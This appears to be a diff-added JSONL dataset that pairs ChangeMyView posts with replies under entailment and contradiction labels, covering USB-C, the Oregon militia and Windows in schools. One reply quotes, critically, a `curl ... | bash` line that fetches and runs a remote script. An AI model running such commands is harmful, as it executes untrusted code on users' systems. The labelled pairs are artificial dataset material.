+    "author": "argumentativ",
+    "comment_id": "d9flnkr",
+    "parent_id": "t3_5aceoz",
+    "score": 3,
+    "created_utc": 1477934533,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.12307692307692308
+}
+{
+  "nli_id": 14,
+  "pair_line": 7,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Apple are falsely equating simplicity with minimalism in their hardware design",
+    "body": "**Update**\n\nThanks for all the replies, there's been some really useful points and I'll dish out the deltas appropriately. The most convincing argument I've heard is that Apple is trying to build a computer for the near future and if it doesn't work for you then you don't have to buy it. USB-C is the future so why bother putting anything else in? USB lets you charge from a battery charger which is an extra convenience, even if it comes at the loss of MagSafe so why have a dedicated power socket?...",
+    "author": "mxlp",
+    "submission_id": "t3_5aceoz"
+  },
+  "hypothesis": {
+    "body": "I'd like to play devil's advocate and elaborate on the Ford quote argument, that Apple is pushing the market forward and even though it might be painful it's for the best. \n\n&gt;Removing USB A ports and replacing them with USB C ports isn't moving towards having no cables though. That's embracing the new standard of cable at the expense of easy use with the last 15 years of technology.\n\nIt absolutely is, if USB-C is the peripheral between wired era and wireless era. Apple was faced with a choice in their decision to push towards wireless peripherals - eliminate the USB A connections and provide the user NO option for wired connection, or use the new standard and offer pain-in-the-ass dongles that might help convince people to just adapt to the new standard and eat the cost? Progress isn't without growing pains. \n\n&gt;Because that does have some merit but it would make more sense to use their clout in the industry to make more devices (across the pricing ranges) bluetooth enabled.\n\nExactly, but this is one generation too early for them to do so. Their clout is not enough that they can change the industry tomorrow, focusing on more bluetooth enabled devices should be the goal for the next product revamp. \n\n\n&gt;Equally with headphones on the iPhone. If they included simple bluetooth headphones with every iPhone that would make lots more people start using the existing functionality, and not just people who buy the new iPhone but any owner of a device with Bluetooth 4.0.\n\nThis I agree with, and it would be the classically \"Apple\" move, but it seems clear this was an economic decision. Would have driven the price up too much. \n",
+    "author": "mj1176",
+    "comment_id": "d9fj2gb",
+    "parent_id": "t3_5aceoz",
+    "score": 7,
+    "created_utc": 1477931746,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.12307692307692308
+}
+{
+  "nli_id": 15,
+  "pair_line": 8,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Apple are falsely equating simplicity with minimalism in their hardware design",
+    "body": "**Update**\n\nThanks for all the replies, there's been some really useful points and I'll dish out the deltas appropriately. The most convincing argument I've heard is that Apple is trying to build a computer for the near future and if it doesn't work for you then you don't have to buy it. USB-C is the future so why bother putting anything else in? USB lets you charge from a battery charger which is an extra convenience, even if it comes at the loss of MagSafe so why have a dedicated power socket?...",
+    "author": "mxlp",
+    "submission_id": "t3_5aceoz"
+  },
+  "hypothesis": {
+    "body": "You have some good point, and - needless to say - the bazillion people at apple working on this have some as well:\n\n1. Apple has exposure to other who innovate.  One of the risks of being the incumbent is that you defend your existing position at the expense of moving the industry forward. You can bet your bottom dollar that Motorola and blackberry had designs for phones that were like the iPhone in substantial ways, but it was going to be really hard to give up the pole position and high margins by breaking away from there model.  The blew it - the iPhone idea seemed too hard, too far away (remember that when apple introduced the iPhone it _was not_ in  leadership position in any corner of computing.  It had nothing to lose, and blackberry had everything to lose.  It's easy to frame your perspective as the force that anchors a company and puts that at tremendous risk.  It's not a far cry to say that you're saying the same thing as \"keyboard entry is way better, this touchscreen is going to piss people off\".  You're like the troves of blackberry fans that overwhelm market research and ultimately led to decision making that created massive exposure for Blackberry.   Apple is taking serious gambles that given them the ability to stay in front.  \n\n2. The idea that you know something that apple doesn't is far fetched.\n\n3. Mabooks and iMacs _must_ innovate.  They are minor marketshare devices and essentially irrelevant on the balance sheet of the business - taking risks with these in hopes of breaking out makes a ton of sense. \n\n4. You're romanticizing the past.  If I were to hand you an iPhone 1, you'd think it wasn't a good device.  At each and every step of the way apple has pissed of people, yet ultimately it defines what \"good device\" is, despite those that complain about every generations changes.  It's the balance of things that matter and when change occurs it's very tempting to see any change as bad. You'll need to take a \"wait and see\" approach, otherwise you're just playing vegas.",
+    "author": "bguy74",
+    "comment_id": "d9fhirj",
+    "parent_id": "t3_5aceoz",
+    "score": 97,
+    "created_utc": 1477930050,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.1050228310502283
+}
+{
+  "nli_id": 16,
+  "pair_line": 8,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Apple are falsely equating simplicity with minimalism in their hardware design",
+    "body": "**Update**\n\nThanks for all the replies, there's been some really useful points and I'll dish out the deltas appropriately. The most convincing argument I've heard is that Apple is trying to build a computer for the near future and if it doesn't work for you then you don't have to buy it. USB-C is the future so why bother putting anything else in? USB lets you charge from a battery charger which is an extra convenience, even if it comes at the loss of MagSafe so why have a dedicated power socket?...",
+    "author": "mxlp",
+    "submission_id": "t3_5aceoz"
+  },
+  "hypothesis": {
+    "body": "I'd like to play devil's advocate and elaborate on the Ford quote argument, that Apple is pushing the market forward and even though it might be painful it's for the best. \n\n&gt;Removing USB A ports and replacing them with USB C ports isn't moving towards having no cables though. That's embracing the new standard of cable at the expense of easy use with the last 15 years of technology.\n\nIt absolutely is, if USB-C is the peripheral between wired era and wireless era. Apple was faced with a choice in their decision to push towards wireless peripherals - eliminate the USB A connections and provide the user NO option for wired connection, or use the new standard and offer pain-in-the-ass dongles that might help convince people to just adapt to the new standard and eat the cost? Progress isn't without growing pains. \n\n&gt;Because that does have some merit but it would make more sense to use their clout in the industry to make more devices (across the pricing ranges) bluetooth enabled.\n\nExactly, but this is one generation too early for them to do so. Their clout is not enough that they can change the industry tomorrow, focusing on more bluetooth enabled devices should be the goal for the next product revamp. \n\n\n&gt;Equally with headphones on the iPhone. If they included simple bluetooth headphones with every iPhone that would make lots more people start using the existing functionality, and not just people who buy the new iPhone but any owner of a device with Bluetooth 4.0.\n\nThis I agree with, and it would be the classically \"Apple\" move, but it seems clear this was an economic decision. Would have driven the price up too much. \n",
+    "author": "mj1176",
+    "comment_id": "d9fj2gb",
+    "parent_id": "t3_5aceoz",
+    "score": 7,
+    "created_utc": 1477931746,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.1050228310502283
+}
+{
+  "nli_id": 17,
+  "pair_line": 9,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Apple are falsely equating simplicity with minimalism in their hardware design",
+    "body": "**Update**\n\nThanks for all the replies, there's been some really useful points and I'll dish out the deltas appropriately. The most convincing argument I've heard is that Apple is trying to build a computer for the near future and if it doesn't work for you then you don't have to buy it. USB-C is the future so why bother putting anything else in? USB lets you charge from a battery charger which is an extra convenience, even if it comes at the loss of MagSafe so why have a dedicated power socket?...",
+    "author": "mxlp",
+    "submission_id": "t3_5aceoz"
+  },
+  "hypothesis": {
+    "body": "Most of the examples you have given are relevant to a power user. You have to realize that Apple's target audience has changed significantly over the years. It used to be the boutique product company for creative professionals. Now, it is a platform for kids and non tech savvy people. For most of them, their computer and their primary electronic device is their iPad or their iPhone.\n\nYou have 2,3,4 year old kids that spend hours every day on their iPad. Their parents often buy an iPad specifically for their kids. With a user demographic like this, minimalism will almost always trump maximalism even if it means it makes a few other things painful. Being able to do the 5-6 most important things in a simple discoverable manner is extremely important, even if it means that the 20 other things that power users need require workarounds, additional dongles, and whatnot. \n\ntl;dr - Apple is selling far too many devices to young kids and technically illiterate people. They are keeping their design minimalistic to allow these people to easily discover and use the basic functions of their Apple device - at the cost of making life difficult for their traditional target audience - the power users.",
+    "author": "nomnommish",
+    "comment_id": "d9ftya5",
+    "parent_id": "t3_5aceoz",
+    "score": 6,
+    "created_utc": 1477944086,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.1016949152542373
+}
+{
+  "nli_id": 18,
+  "pair_line": 9,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Apple are falsely equating simplicity with minimalism in their hardware design",
+    "body": "**Update**\n\nThanks for all the replies, there's been some really useful points and I'll dish out the deltas appropriately. The most convincing argument I've heard is that Apple is trying to build a computer for the near future and if it doesn't work for you then you don't have to buy it. USB-C is the future so why bother putting anything else in? USB lets you charge from a battery charger which is an extra convenience, even if it comes at the loss of MagSafe so why have a dedicated power socket?...",
+    "author": "mxlp",
+    "submission_id": "t3_5aceoz"
+  },
+  "hypothesis": {
+    "body": "I'd like to play devil's advocate and elaborate on the Ford quote argument, that Apple is pushing the market forward and even though it might be painful it's for the best. \n\n&gt;Removing USB A ports and replacing them with USB C ports isn't moving towards having no cables though. That's embracing the new standard of cable at the expense of easy use with the last 15 years of technology.\n\nIt absolutely is, if USB-C is the peripheral between wired era and wireless era. Apple was faced with a choice in their decision to push towards wireless peripherals - eliminate the USB A connections and provide the user NO option for wired connection, or use the new standard and offer pain-in-the-ass dongles that might help convince people to just adapt to the new standard and eat the cost? Progress isn't without growing pains. \n\n&gt;Because that does have some merit but it would make more sense to use their clout in the industry to make more devices (across the pricing ranges) bluetooth enabled.\n\nExactly, but this is one generation too early for them to do so. Their clout is not enough that they can change the industry tomorrow, focusing on more bluetooth enabled devices should be the goal for the next product revamp. \n\n\n&gt;Equally with headphones on the iPhone. If they included simple bluetooth headphones with every iPhone that would make lots more people start using the existing functionality, and not just people who buy the new iPhone but any owner of a device with Bluetooth 4.0.\n\nThis I agree with, and it would be the classically \"Apple\" move, but it seems clear this was an economic decision. Would have driven the price up too much. \n",
+    "author": "mj1176",
+    "comment_id": "d9fj2gb",
+    "parent_id": "t3_5aceoz",
+    "score": 7,
+    "created_utc": 1477931746,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.1016949152542373
+}
+{
+  "nli_id": 19,
+  "pair_line": 10,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Apple are falsely equating simplicity with minimalism in their hardware design",
+    "body": "**Update**\n\nThanks for all the replies, there's been some really useful points and I'll dish out the deltas appropriately. The most convincing argument I've heard is that Apple is trying to build a computer for the near future and if it doesn't work for you then you don't have to buy it. USB-C is the future so why bother putting anything else in? USB lets you charge from a battery charger which is an extra convenience, even if it comes at the loss of MagSafe so why have a dedicated power socket?...",
+    "author": "mxlp",
+    "submission_id": "t3_5aceoz"
+  },
+  "hypothesis": {
+    "body": "I'm not so much trying to change your view with this response, but just to add something that I think is worth noting.\n\nApple has been successful before with this approach - namely, in selling the Macbook Air without an optical drive or ethernet port.  At the time, both of these features were still the norm for laptops to have.  To get wired internet or DVD to work with a MBA, one needed dongles/external drives.  \n\nBut in a short period of time, Apple was proven right.  With wifi becoming faster, and USB keys moving to higher storage capabilities, it became clear ethernet ports and optical drives were indeed unnecessary features for most laptops.  And Apple went on to remove them from the retina MBP line.\n\nNow one could have leveled the same criticism at them then, as they get now for going USB-C only.  But this time I think they've mis-stepped.  However, I think it's more of a timing issue.  And I think it's a mis-step because: \n\na) we're at the point now where few if any accessories use USB-C (especially display adapters)\n\nb) they haven't synched their iphone7 philosophy with the MBP (one has USB-A, one USB-C, one has 3.5mm jack, one doesn't)\n\nSo in the future, I think it is a solution that is both simple and minimalistic.  But right now, I think it was just bad judgement.\n\nTL;DR:  I don't think Apple is wrong in the long run, but they're wrong in 2016.  So their design choices re: USB-C and 3.5mm have been mistakes.",
+    "author": "LiveLaughLoveRevenge",
+    "comment_id": "d9fj8zp",
+    "parent_id": "t3_5aceoz",
+    "score": 54,
+    "created_utc": 1477931938,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.10204081632653061
+}
+{
+  "nli_id": 20,
+  "pair_line": 10,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Apple are falsely equating simplicity with minimalism in their hardware design",
+    "body": "**Update**\n\nThanks for all the replies, there's been some really useful points and I'll dish out the deltas appropriately. The most convincing argument I've heard is that Apple is trying to build a computer for the near future and if it doesn't work for you then you don't have to buy it. USB-C is the future so why bother putting anything else in? USB lets you charge from a battery charger which is an extra convenience, even if it comes at the loss of MagSafe so why have a dedicated power socket?...",
+    "author": "mxlp",
+    "submission_id": "t3_5aceoz"
+  },
+  "hypothesis": {
+    "body": "Simplicity is part of Apple's design philosophy, but that's not what's driving the swap to USB-C. Neither is minimalism.\n\nApple is trying to drive the market. USB-C is in a pretty common situation: it's *vastly* superior to every other port/protocol out there, but product developers are very hesitant to start designing products for it because it isn't common enough. It can't become popular because there are no devices for it, but there are no devices for it because it isn't popular.\n\nIf left alone, it would likely take years for USB-C to fully take hold. Apple, however, is forcibly shoving USB-C into the main stream. Now, for instance, people will start making USB-C mouses and headphones and flash drives, since they know that there will be a market for them (the Apple fans). Once the peripherals are available, other computer manufacturers will start including the ports on their laptops and such.\n\n**tl;dr: Apple is not pushing USB-C as part of a desire to be simple, they're pushing it because they want to get ahead of the curve and continue their trend of driving the market.**",
+    "author": "AmoebaMan",
+    "comment_id": "d9geniz",
+    "parent_id": "t3_5aceoz",
+    "score": 2,
+    "created_utc": 1477972367,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.10204081632653061
+}
+{
+  "nli_id": 21,
+  "pair_line": 11,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: The Oregon \"Militia\" are Terrorists, and if they were not white but instead from a brown/middle eastern ethnicity, doing the same thing, same reason, they'd be called Terrorists immediately",
+    "body": "Can someone explain to me why these group of people in Oregon are not considered terrorists, and are not being called that? Not on reddit, not in the media, im having a tough time finding anyone saying it\n\nThey have taken a building by force, with guns.. They have a political aim/agenda. They also have said that they will kill anyone who enters.. How is that not terrorism? \n\nIf they were brown, and from middle eastern origin or descent, showed up and took the building, and did the same exact thi...",
+    "author": "fuubar2000",
+    "submission_id": "t3_40uylb"
+  },
+  "hypothesis": {
+    "body": "Terrorism - the use of **violent acts** to **frighten the people in an area** as a way of **trying to achieve a political goal**\n\nviolent acts - Nobody has died or been injured.  Yes, they may be taking aggressive, non-peaceful actions.  But, so far nothing **violent** has happened.\n\nfrighten the people in an area - Nobody in the area is frightened by this\n\ntrying to achieve a political goal - yes\n\nSo, there are 3 criteria for terrorism and in this situation, at most only 2 of the criteria are met.\n\n\n\n",
+    "author": "JoeDeluxe",
+    "comment_id": "cyxyojz",
+    "parent_id": "t3_40uylb",
+    "score": 1,
+    "created_utc": 1452785073,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.05405405405405406
+}
+{
+  "nli_id": 22,
+  "pair_line": 11,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: The Oregon \"Militia\" are Terrorists, and if they were not white but instead from a brown/middle eastern ethnicity, doing the same thing, same reason, they'd be called Terrorists immediately",
+    "body": "Can someone explain to me why these group of people in Oregon are not considered terrorists, and are not being called that? Not on reddit, not in the media, im having a tough time finding anyone saying it\n\nThey have taken a building by force, with guns.. They have a political aim/agenda. They also have said that they will kill anyone who enters.. How is that not terrorism? \n\nIf they were brown, and from middle eastern origin or descent, showed up and took the building, and did the same exact thi...",
+    "author": "fuubar2000",
+    "submission_id": "t3_40uylb"
+  },
+  "hypothesis": {
+    "body": "It's armed insurrection. Terrorism is the use of [deadly] force against civilians. Destruction of infrastructure is sabotage.",
+    "author": "jeremyfrankly",
+    "comment_id": "cyxtxe8",
+    "parent_id": "t3_40uylb",
+    "score": 2,
+    "created_utc": 1452775519,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.05405405405405406
+}
+{
+  "nli_id": 23,
+  "pair_line": 12,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: The Oregon \"Militia\" are Terrorists, and if they were not white but instead from a brown/middle eastern ethnicity, doing the same thing, same reason, they'd be called Terrorists immediately",
+    "body": "Can someone explain to me why these group of people in Oregon are not considered terrorists, and are not being called that? Not on reddit, not in the media, im having a tough time finding anyone saying it\n\nThey have taken a building by force, with guns.. They have a political aim/agenda. They also have said that they will kill anyone who enters.. How is that not terrorism? \n\nIf they were brown, and from middle eastern origin or descent, showed up and took the building, and did the same exact thi...",
+    "author": "fuubar2000",
+    "submission_id": "t3_40uylb"
+  },
+  "hypothesis": {
+    "body": "It's a protest that has broken the law.  That makes the participants criminals.  Terrorism generally is used to refer to acts that put the public at grave danger or target the public or government for extreme violence.  Bombings, mass shootings, flying planes into buildings, that sort of thing.\n\nThis seems to be much more in the realm of ordinary crime to me.",
+    "author": "huadpe",
+    "comment_id": "cyxc3ki",
+    "parent_id": "t3_40uylb",
+    "score": 86,
+    "created_utc": 1452731611,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.058823529411764705
+}
+{
+  "nli_id": 24,
+  "pair_line": 12,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: The Oregon \"Militia\" are Terrorists, and if they were not white but instead from a brown/middle eastern ethnicity, doing the same thing, same reason, they'd be called Terrorists immediately",
+    "body": "Can someone explain to me why these group of people in Oregon are not considered terrorists, and are not being called that? Not on reddit, not in the media, im having a tough time finding anyone saying it\n\nThey have taken a building by force, with guns.. They have a political aim/agenda. They also have said that they will kill anyone who enters.. How is that not terrorism? \n\nIf they were brown, and from middle eastern origin or descent, showed up and took the building, and did the same exact thi...",
+    "author": "fuubar2000",
+    "submission_id": "t3_40uylb"
+  },
+  "hypothesis": {
+    "body": "These guys aren't terrorists because they don't WANT violence, they aren't making people afraid, and they have demands. Terrorists are different, when they act they act to kill or hurt. They don't attack strategic targets, or targets that will fight them. They attack targets that make people afraid. The marathon bombing: \" hey I knew someone in that race\" \"will it happen again this year?\" 9/11: even our military HQ was hit \"no one is safe!\" Car bombs: now you can't even feel safe walking down the street. They don't have any demands. They don't want you to know what they want, they want to keep you guessing and worrying when the next attack is coming. Your frantic, \"I don't know what to do, what do they want? Why? How will the next one come? Terrorists want you afraid and won't give you any real demands (leave the Middle East \"yeah right\" says U.S.). The guys in Oregon tell you exactly what they want and they say exactly when, where, who, and why they will hurt people. That's the difference. ",
+    "author": "Ndvorsky",
+    "comment_id": "cyynz4y",
+    "parent_id": "t3_40uylb",
+    "score": 1,
+    "created_utc": 1452821305,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.058823529411764705
+}
+{
+  "nli_id": 25,
+  "pair_line": 13,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: The Oregon \"Militia\" are Terrorists, and if they were not white but instead from a brown/middle eastern ethnicity, doing the same thing, same reason, they'd be called Terrorists immediately",
+    "body": "Can someone explain to me why these group of people in Oregon are not considered terrorists, and are not being called that? Not on reddit, not in the media, im having a tough time finding anyone saying it\n\nThey have taken a building by force, with guns.. They have a political aim/agenda. They also have said that they will kill anyone who enters.. How is that not terrorism? \n\nIf they were brown, and from middle eastern origin or descent, showed up and took the building, and did the same exact thi...",
+    "author": "fuubar2000",
+    "submission_id": "t3_40uylb"
+  },
+  "hypothesis": {
+    "body": "&gt; Instead of telling me \"Well they haven't hurt anyone\" or \"It's peaceful\" , tell me if you went downtown in your city and took a federal building with guns, would that be legal and allowed?\n\nIt's not legal nor allowed, but that only makes them criminals. In order to be called terrorists, they need to have committed Acts Of Terror.\n\nNow what are Acts of Terror? Since terror means fear, we could define it as an attempt to make people afraid or feel unsafe by killing people at random, so people are afraid they might be next.\n\nThose guys fail at that point. They took a building, but there wasn't violence directed at anyone, and particularly there wasn't the type of random violence that makes people feel unsafe or threatened that it can happen at any moment to them.\n",
+    "author": "terryfrombronx",
+    "comment_id": "cyxw2ii",
+    "parent_id": "t3_40uylb",
+    "score": 1,
+    "created_utc": 1452780478,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.3
+}
+{
+  "nli_id": 26,
+  "pair_line": 13,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: The Oregon \"Militia\" are Terrorists, and if they were not white but instead from a brown/middle eastern ethnicity, doing the same thing, same reason, they'd be called Terrorists immediately",
+    "body": "Can someone explain to me why these group of people in Oregon are not considered terrorists, and are not being called that? Not on reddit, not in the media, im having a tough time finding anyone saying it\n\nThey have taken a building by force, with guns.. They have a political aim/agenda. They also have said that they will kill anyone who enters.. How is that not terrorism? \n\nIf they were brown, and from middle eastern origin or descent, showed up and took the building, and did the same exact thi...",
+    "author": "fuubar2000",
+    "submission_id": "t3_40uylb"
+  },
+  "hypothesis": {
+    "body": "&gt;Instead of telling me \"Well they haven't hurt anyone\" or \"It's peaceful\" , tell me if you went downtown in your city and took a federal building with guns, would that be legal and allowed? No it wouldn't. That's not fuckin peaceful\n \nLike when students seized the Willard Straight Hall in 1969? Admittedly, not a federal building. ",
+    "author": "BadAtStuff",
+    "comment_id": "cyxbulh",
+    "parent_id": "t3_40uylb",
+    "score": 18,
+    "created_utc": 1452731234,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.3
+}
+{
+  "nli_id": 27,
+  "pair_line": 14,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Microsoft Windows should not be used in schools",
+    "body": "This view is probably a bit controversial given the wide use of Microsoft Windows in schools (in the US and quite a few countries all over the world) and might seem as a bit of a rant against Microsoft but bear with me. I'm definitely not a Microsoft fan but I'm not exactly an Apple or Linux fanboy either.\n\n**( EDIT: I'm so sorry if you answered and wondered why it's changed. I posted it because I wanted a bigger box to write in. My apologies if I've wasted your time. 3:45 pm Eastern Time. )**\n\n...",
+    "author": "depaysementKing",
+    "submission_id": "t3_53j8hn"
+  },
+  "hypothesis": {
+    "body": "All the other arguments I had have already been made, but I'd like to respond to this:\n\n&gt; One is running a package manager and the other is copying files to the Applications folder. Windows has a .exe file that isn't always preferable given the sheer amount of malware masquerading as .exe files.\n\nFirst, Windows malware doesn't \"masquerade as .exe files\", it *is* (usually) .exe files.\n\nSecond, the fact that there's no installer doesn't really mean anything. At some point someone is going to run some code, and any code can be malicious, not just code found in Windows application installers. On OS X (in my limited understanding, I have about 30 minutes total experience with it) if you wanted to distribute malware, you could just package it up in an .app and the malicious code would run the first time they run the application rather than at install time. On Linux, you do have official package manager repositories that generally contain only safe things, but not much can protect a system from an incompetent user running random stuff from the internet - in fact, `curl http://example.com/totally-safe-and-not-malicious-script.sh | bash` seems to have become a thing recently. Non-Windows systems are more secure mostly because their users tend to be more knowledgeable, not because of how applications are installed.",
+    "author": "scgtrp",
+    "comment_id": "d7u02oh",
+    "parent_id": "t3_53j8hn",
+    "score": 1,
+    "created_utc": 1474335423,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.11029411764705882
+}
+{
+  "nli_id": 28,
+  "pair_line": 14,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Microsoft Windows should not be used in schools",
+    "body": "This view is probably a bit controversial given the wide use of Microsoft Windows in schools (in the US and quite a few countries all over the world) and might seem as a bit of a rant against Microsoft but bear with me. I'm definitely not a Microsoft fan but I'm not exactly an Apple or Linux fanboy either.\n\n**( EDIT: I'm so sorry if you answered and wondered why it's changed. I posted it because I wanted a bigger box to write in. My apologies if I've wasted your time. 3:45 pm Eastern Time. )**\n\n...",
+    "author": "depaysementKing",
+    "submission_id": "t3_53j8hn"
+  },
+  "hypothesis": {
+    "body": "I used Linux for 80% of the machines I install for personal use.  70% Windows (30% mac) at work.  I still always have issues with Linux for the desktop.  I favor mac and windows second and Linux desktop as a distance third.\n\n\n&gt; Having an emphasis on Microsoft Office in school is geared to a desk job that uses Office. \n\nThis is not a good argument because the LibreOffice (Office) equivalent is not as powerful and has similar features.  Engineers use a variety of different pieces of software that is available on Windows.     Plus, you don't mention the type of engineering.  I worked with GIS (Geographic Software) that was mostly geared towards windows, used for industrial and electrical engineering.\n\n&gt; People are introduced to Windows and its interface and have no idea that other operating systems exist \n\nThis is a fair argument except you could make better arguments that becoming proficient in Windows is very useful for a variety of different fields.  A lot of kids don't have access to computers.  If you learn something esoteric, maybe they become even more unfamiliar with a fairly common platform (Windows).   One of my first jobs was installing win95 for ATT operators that would go out into the field and install equipment.  Sometimes highly uneducated.  It was easier for me and them to use and install the required software.  We could make the argument that maybe Linux would have been OK, but there were very few experienced Linux experts to look at issues.\n\n&gt; It's much easier for students to install and run programs on other OS than Windows.\n\nThis argument only works for the most basic installs and configurations.  I have ALWAYS had an easier time with Windows and Mac.  Here are some of the questions I asked on askubuntu.  With windows/mac, things just work. \n\nMy corporate wifi wouldn't work.  \"WPA2 and EAP cannot connect like other devices\", couldn't use wifi at work.\n\nOn another machine.  I wanted to put ubuntu on a mac, couldn't get the wifi to work at all.\n\nRemote Desktop doesn't work, connecting to windows.  Works for mac.\n\nI always have issues with Linux software and then try not upgrading and using a machine after a couple of years.   Software updates don't work.  Sometimes the software just won't run at all.  Like Chrome on an old linux machine.  Try running netflix or streaming software on an old linux machine.\n\n\n&gt; Windows has changed so much over the past few years but educational books don't change that fast.\n\nIt hasn't changed much at all. I typing this on a Windows 7 machine (about 7 years old), I used Windows XP for 5 years.  That is two OSes in more than a decade.  Ubuntu was on Ubuntu 4 in 2004 and they are Ubuntu 16 now.  There have been major updates almost every year.   And my Ubuntu machines are mostly useless because a lot of the software can't be updated or won't even work properly like chrome.  Or open office which I had.\n\n&gt; You could substitute Windows with a Linux distro or Mac OS and still teach students. With less pain\n\n\nAnd You probably could, but a lot of those user skills will be wasted because you rarely see Linux desktop out in public.  When you go to a store or mall or anywhere, take a photo of a linux desktop and post it here. (for fun, compare that to the number of windows desktops around).\nOn top of that, you have to have Linux experts to maintain those systems for hundreds of kids.  \n\nI don't know what kind of Linux user you are, but you are going to have to type something, either at the terminal or editing a configuration file.  Some users can't type.  Some students can't even read.  How are you going to deal with those students that were capable with Windows and Mac?\n\nYou can teach all the top oses, Windows, Linux and Mac.  And people will use Linux if it becomes a better, easier to use OS and system.  We shouldn't force people to use Linux because Windows has so overwhelming dominated the OS desktop market.  I wager Google will probably come up with another Desktop OS that doesn't Linux and will be a better desktop experience than Windows, before more people use Linux. I know a lot of people love the mythos around Linux but there are a lot of flaws with the entire approach to software.  I know a lot of people that end up not liking Windows after heavy use.  I have used Linux most of my life and of the three top OS systems, I always consider Linux the worst desktop experience every time.  (minus install and setup, but pretty much everything else).\n\nHere is a recent reference on Linux issues which could be applied to your view.\n\nhttp://itvision.altervista.org/why.linux.is.not.ready.for.the.desktop.current.html",
+    "author": "berlinbrown",
+    "comment_id": "d7vemw8",
+    "parent_id": "t3_53j8hn",
+    "score": 1,
+    "created_utc": 1474419498,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.11029411764705882
+}
+{
+  "nli_id": 29,
+  "pair_line": 15,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Microsoft Windows should not be used in schools",
+    "body": "This view is probably a bit controversial given the wide use of Microsoft Windows in schools (in the US and quite a few countries all over the world) and might seem as a bit of a rant against Microsoft but bear with me. I'm definitely not a Microsoft fan but I'm not exactly an Apple or Linux fanboy either.\n\n**( EDIT: I'm so sorry if you answered and wondered why it's changed. I posted it because I wanted a bigger box to write in. My apologies if I've wasted your time. 3:45 pm Eastern Time. )**\n\n...",
+    "author": "depaysementKing",
+    "submission_id": "t3_53j8hn"
+  },
+  "hypothesis": {
+    "body": "You have a view that Microsoft should not be used, but say that even an education in VBA would be more useful than in Word. Is it possible that your problem is with general curriculum choices more than with Microsoft? ",
+    "author": "Maukeb",
+    "comment_id": "d7tnpkh",
+    "parent_id": "t3_53j8hn",
+    "score": 5,
+    "created_utc": 1474318112,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.14814814814814814
+}
+{
+  "nli_id": 30,
+  "pair_line": 15,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Microsoft Windows should not be used in schools",
+    "body": "This view is probably a bit controversial given the wide use of Microsoft Windows in schools (in the US and quite a few countries all over the world) and might seem as a bit of a rant against Microsoft but bear with me. I'm definitely not a Microsoft fan but I'm not exactly an Apple or Linux fanboy either.\n\n**( EDIT: I'm so sorry if you answered and wondered why it's changed. I posted it because I wanted a bigger box to write in. My apologies if I've wasted your time. 3:45 pm Eastern Time. )**\n\n...",
+    "author": "depaysementKing",
+    "submission_id": "t3_53j8hn"
+  },
+  "hypothesis": {
+    "body": "your argument focus on why office, not scripting or general knowledge about computer.\n\nthe problem is on curriculum, not used os. Teaching kids other os when windows is dominant everwhere is alienating",
+    "author": "Meychelanous",
+    "comment_id": "d7uijt7",
+    "parent_id": "t3_53j8hn",
+    "score": 1,
+    "created_utc": 1474376572,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.14814814814814814
+}
+{
+  "nli_id": 31,
+  "pair_line": 16,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Microsoft Windows should not be used in schools",
+    "body": "This view is probably a bit controversial given the wide use of Microsoft Windows in schools (in the US and quite a few countries all over the world) and might seem as a bit of a rant against Microsoft but bear with me. I'm definitely not a Microsoft fan but I'm not exactly an Apple or Linux fanboy either.\n\n**( EDIT: I'm so sorry if you answered and wondered why it's changed. I posted it because I wanted a bigger box to write in. My apologies if I've wasted your time. 3:45 pm Eastern Time. )**\n\n...",
+    "author": "depaysementKing",
+    "submission_id": "t3_53j8hn"
+  },
+  "hypothesis": {
+    "body": "First off, it is WAY easier to set up and maintain an active directory environment than a Linux environment. With AD, you get all of the other spiffy integrations like exchange, group policy that you can link to user/computer profiles, powerful deployment tools like MDT and SCCM. The list goes on and on. Now most of this CAN be done in Linux, but I challenge you to build it, secure it, and keep it updated. I'm a pretty decent Linux admin (10+ yrs) and work for a Fortune 30 company, and I can 100% tell you that it would be a nightmare to maintain. Additionally, all it takes is a \"decent\" windows admin to maintain an AD environment for a school. Any Linux admin that has a skillset to build/maintain that infrastructure is going to want WAY more money than the windows admin. So the simple answer is your view is 100% correct, but it fails at scale in the real world. \n\n\nYou need to change your focus to say \"Why do technology programs at schools suck so bad? What are we doing to train the future sysadmins of the world?\" You can get a 4 year Computer Science Engineering degree and never touch a Linux machine, much less learn how to administer one (including windows sysadmin work). A typical CS degree has you take a couple programming classes (mostly Java) and maybe a database class. The rest is just fluff. \n\nOne final point, do you even fathom how horrible it would be to support/train a school staff how to use a new OS? Go steal your mom/dads laptop, install your favorite flavor of Linux, then hand it to them and tell them to call you ANY time they need to know how to do something. And don't be a slacker about 